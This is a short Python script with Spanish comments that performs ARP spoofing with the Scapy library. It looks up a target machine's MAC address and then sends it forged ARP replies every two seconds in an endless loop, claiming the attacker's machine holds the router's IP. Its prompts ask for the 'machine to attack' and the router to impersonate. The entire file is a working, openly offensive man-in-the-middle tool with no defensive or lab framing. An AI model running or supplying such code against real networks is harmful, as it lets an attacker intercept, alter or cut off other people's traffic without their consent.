from scapy.all import *  # Importa todas las funciones de la biblioteca Scapy
import time  # Importa la biblioteca de tiempo

def get_mac(ip):
    ans, unans = arping(ip, verbose=0)  # Envía una solicitud ARP para obtener la dirección MAC de la IP dada
    for s, r in ans:
        return r[Ether].src  # Devuelve la dirección MAC de la respuesta ARP
    return None  # Si no se recibe respuesta, devuelve None

def arp_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)  # Obtiene la dirección MAC de la IP objetivo
    if target_mac is None:
        print(f"No se puede obtener la MAC de {target_ip}")  # Imprime un mensaje si no se puede obtener la MAC
        return

    # Crea un paquete ARP falsificado diciendo que la IP de spoof_ip tiene la MAC de la máquina atacante
    spoofed_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    
    print(f"Iniciando ARP spoofing hacia {target_ip}, suplantando {spoof_ip}")  # Imprime un mensaje de inicio

    while True:
        send(spoofed_packet, verbose=False)  # Envía el paquete ARP falsificado continuamente
        time.sleep(2)  # Espera 2 segundos antes de enviar el siguiente paquete

if __name__ == "__main__":
    target_ip = input("IP DE LA MAQUINA A ATACAR: ")  # Solicita la IP de la máquina objetivo
    spoof_ip = input("IP DEL ROUTER DE LA RED: ")  # Solicita la IP del router (o cualquier otra IP a suplantar)
    
    arp_spoof(target_ip, spoof_ip)  # Llama a la función arp_spoof con las IPs proporcionadas
